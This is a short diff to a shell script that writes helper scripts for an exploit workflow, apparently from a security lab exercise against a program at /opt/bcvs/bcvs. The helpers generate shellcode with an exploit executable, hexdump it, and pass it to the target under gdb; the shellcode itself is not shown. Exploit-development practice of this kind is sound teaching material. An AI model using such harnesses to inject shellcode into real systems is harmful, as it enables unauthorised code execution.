@@ -32,10 +32,18 @@ touch .bcvs/block.list
 OFFSET=0
 
 cat <<EOS > "run_w_gdb.sh"
-SC=\$($EXPLOIT_EXE \$OFFSET)
+#!/bin/bash
+SC=\$($EXPLOIT_EXE $OFFSET)
 echo "Shellcode:"
 echo -n "\$SC" | hexdump -C
 gdb --args /opt/bcvs/bcvs ci "\$SC"
+EOS
+
+cat <<EOS > "echo_shellcode.sh"
+#!/bin/bash
+SC=\$($EXPLOIT_EXE $OFFSET)
+echo "Shellcode:"
+echo -n "\$SC" | hexdump -C
 EOS
 
 cat <<EOS > "update_sploit.sh"
